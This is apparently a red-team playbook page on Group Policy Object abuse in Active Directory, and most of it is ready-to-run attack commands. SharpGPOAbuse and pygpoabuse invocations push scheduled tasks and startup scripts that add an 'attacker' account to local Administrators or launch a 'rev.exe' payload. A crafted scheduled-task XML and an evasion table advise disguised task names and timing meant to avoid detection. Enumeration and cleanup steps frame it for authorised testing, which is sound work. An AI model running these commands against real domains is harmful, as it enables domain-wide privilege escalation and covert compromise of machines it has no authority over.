# GPO Abuse

> **MITRE ATT&CK**: Privilege Escalation > T1484.001 - Domain Policy Modification: Group Policy Modification
> **Platforms**: Windows / Active Directory
> **Required Privileges**: Domain User (with GPO edit rights)
> **OPSEC Risk**: Medium-High

## Strategic Overview

Group Policy Objects (GPOs) are one of the most powerful management mechanisms in Active
Directory, controlling security settings, software deployment, scripts, and scheduled tasks
across the domain. When an attacker gains write access to a GPO, they can push malicious
configurations to every computer and user within that GPO's scope. This makes GPO abuse a
high-impact privilege escalation vector, but it carries significant OPSEC risk because GPO
modifications propagate broadly and leave audit trails. A Red Team Lead must carefully
assess the GPO's scope (which OUs and how many machines are affected), the engagement's
stealth requirements, and cleanup feasibility before proceeding with GPO-based attacks.

## Technical Deep-Dive

### Enumeration: Find Writable GPOs

```powershell
# PowerView - find GPOs where current user has write permissions
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericWrite|GenericAll" -and
    $_.SecurityIdentifier -eq (Get-DomainUser $env:USERNAME).objectsid
}

# PowerView - simplified: find GPOs and their permissions
Get-DomainGPO | ForEach-Object {
    $gpo = $_
    Get-DomainObjectAcl -Identity $gpo.DistinguishedName -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite"} |
    Select-Object @{N='GPOName';E={$gpo.DisplayName}}, @{N='GPOGuid';E={$gpo.Name}},
                  SecurityIdentifier, ActiveDirectoryRights
}

# Find which OUs/computers a GPO is linked to (scope assessment)
Get-DomainOU -GPLink "{GPO-GUID}" | Select-Object DistinguishedName
Get-DomainOU -GPLink "{GPO-GUID}" | ForEach-Object {
    Get-DomainComputer -SearchBase $_.DistinguishedName | Select-Object dnshostname
}

# BloodHound - query GPO edges
# Cypher: MATCH (u:User)-[:GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner]->(g:GPO) RETURN u, g
```

### SharpGPOAbuse (C# - from Windows)

SharpGPOAbuse allows adding immediate scheduled tasks, startup scripts, and local group
modifications to GPOs.

```powershell
# Add immediate scheduled task (executes within minutes on targets)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "WindowsUpdate" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup Administrators attacker /add" --GPOName "Vulnerable GPO"

# Add user logon script
.\SharpGPOAbuse.exe --AddUserScript --ScriptName "logon.bat" --ScriptContents "cmd /c C:\temp\rev.exe" --GPOName "Vulnerable GPO"

# Add computer startup script
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName "startup.bat" --ScriptContents "cmd /c C:\temp\rev.exe" --GPOName "Vulnerable GPO"

# Add local admin (modify Restricted Groups via GPO)
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# Add user rights assignment
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount attacker --GPOName "Vulnerable GPO"
```

### New-GPOImmediateTask (PowerView / RSAT)

```powershell
# Create immediate scheduled task via GPO (PowerShell)
# Requires RSAT GroupPolicy module
Import-Module GroupPolicy

# Create a scheduled task that runs immediately
$TaskXML = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="WindowsUpdate" image="0" changed="2024-01-01 00:00:00" uid="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}">
    <Properties action="C" name="WindowsUpdate" runAs="NT AUTHORITY\System" logonType="S4U">
      <Task version="1.3">
        <Actions>
          <Exec>
            <Command>cmd.exe</Command>
            <Arguments>/c net localgroup Administrators attacker /add</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
"@
```

### pygpoabuse (Python - from Linux)

```bash
# Add immediate scheduled task via GPO from Linux
python3 pygpoabuse.py domain.local/user:'password' -gpo-id "12345678-1234-1234-1234-123456789012" \
    -command "cmd.exe /c net localgroup Administrators attacker /add" \
    -taskname "WindowsUpdate" -description "Windows Update Task" -f

# Add computer startup script
python3 pygpoabuse.py domain.local/user:'password' -gpo-id "12345678-1234-1234-1234-123456789012" \
    -command "cmd.exe /c C:\temp\rev.exe" \
    -taskname "SecurityBaseline" -f

# With NTLM hash
python3 pygpoabuse.py domain.local/user -gpo-id "12345678-1234-1234-1234-123456789012" \
    -hashes :NTLM_HASH -command "cmd.exe /c whoami > C:\temp\output.txt" \
    -taskname "DiagCheck" -f
```

### GPO Propagation and Timing

```powershell
# Default GPO refresh interval: 90 minutes + random offset (0-30 min) for computers
# Domain Controllers: 5 minutes
# Immediate scheduled tasks execute at next GPO refresh

# Force GPO update on target (requires access to target)
gpupdate /force

# Check when GPO was last applied on current machine
gpresult /r

# Check GPO application status remotely (requires admin)
Invoke-Command -ComputerName TARGET -ScriptBlock { gpresult /r }
```

### Scope Assessment

Before modifying a GPO, always verify its scope to avoid unintended impact.

```powershell
# List all OUs where the GPO is linked
Get-GPO -Name "Vulnerable GPO" | Get-GPOReport -ReportType XML |
    Select-String -Pattern "SOMPath"

# Count affected computers
(Get-DomainOU -GPLink "{GPO-GUID}" | ForEach-Object {
    Get-DomainComputer -SearchBase $_.DistinguishedName
}).Count

# Prefer GPOs linked to small OUs to limit blast radius
# Avoid modifying Default Domain Policy or Default Domain Controllers Policy
```

### Cleanup

Cleanup is critical for GPO abuse -- modifications persist and affect all machines in scope.

```powershell
# SharpGPOAbuse cleanup - remove the scheduled task
.\SharpGPOAbuse.exe --RemoveComputerTask --TaskName "WindowsUpdate" --GPOName "Vulnerable GPO"

# Manual cleanup - remove scheduled task XML from SYSVOL
# GPO files are in \\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\
# Remove: Machine\Preferences\ScheduledTasks\ScheduledTasks.xml (for computer tasks)
# Remove: User\Preferences\ScheduledTasks\ScheduledTasks.xml (for user tasks)

# Manual cleanup - remove scripts
# Remove: Machine\Scripts\Startup\your_script.bat
# Remove: User\Scripts\Logon\your_script.bat

# Remove local admin addition on affected hosts
net localgroup Administrators attacker /delete

# Increment GPO version number to force re-processing
# (or the cleanup may not propagate until next version change)
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| GPO object modification in AD | Event 5136 (Directory Service Changes) | Cannot avoid; minimize modification window |
| SYSVOL file creation/modification | Event 4663 (File access on SYSVOL) | Cannot avoid; use generic filenames |
| Immediate scheduled task execution | Event 4698/4702 (scheduled task created) | Use one-time tasks, remove after execution |
| GPO version number change | GPO monitoring tools (Microsoft ATA/Defender for Identity) | Unavoidable with GPO modification |
| New local admin addition across many machines | Event 4732 on multiple hosts | Limit GPO scope to single OU if possible |

### OPSEC Risk Mitigation

```
1. SCOPE: Only modify GPOs linked to small, targeted OUs (not Default Domain Policy)
2. TIMING: Execute during business hours when GPO refreshes blend with normal activity
3. NAMING: Use legitimate-sounding task names (WindowsUpdate, SecurityBaseline)
4. CLEANUP: Remove modifications immediately after achieving objective
5. ALTERNATIVE: Consider whether ACL abuse or Kerberos attacks would be stealthier
6. DURATION: Keep the GPO modification window as short as possible
```

## Cross-References

- [ACL Abuse](acl-abuse.md) - gaining write access to GPO objects
- [AD Privilege Escalation Overview](ad-privilege-escalation.md) - comparing GPO abuse to alternatives
- [Lateral Movement](../07-lateral-movement/README.md) - GPO as lateral movement mechanism
- [Persistence](../09-persistence/README.md) - GPO-based persistence techniques

## References

- https://github.com/FSecureLABS/SharpGPOAbuse
- https://github.com/Hackndo/pygpoabuse
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-gpo
- https://www.thehacker.recipes/ad/movement/group-policies
- https://wald0.com/?p=179
